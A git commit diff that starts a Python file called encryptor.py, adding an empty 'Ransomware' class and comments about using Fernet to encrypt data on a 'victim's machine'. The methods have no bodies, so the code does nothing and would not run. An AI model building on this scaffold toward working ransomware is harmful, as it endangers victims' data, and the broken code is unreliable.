a96199da2aa96410d3ed91b55e1e60b876d328f7
Ephraim67 <jonathaneuphrem@gmail.com>
2025-10-04 12:12:23 +0100

    Added more function

--- encryptor.py
+++ encryptor.py
@@ -1,8 +1,28 @@
 from cryptography.fernet import Fernet #used to encrypt files
+
+
+
 import os #to get root system
 
-# declare a class called ransomeware
 
-# define a function that will be used for fernet object, encrypt and decrypt method
+
+
+# declare a class called ransomeware
+class Ransomware:
+    def __init__(self):
+        
+        
+
+    # define a function that will be used for fernet object, encrypt and decrypt method   
+    def generate_key(self):
+
+
+
+
+
+    
+
+
+
 
 # define a function used to generate symetric key used to encrypt data on victim's machine
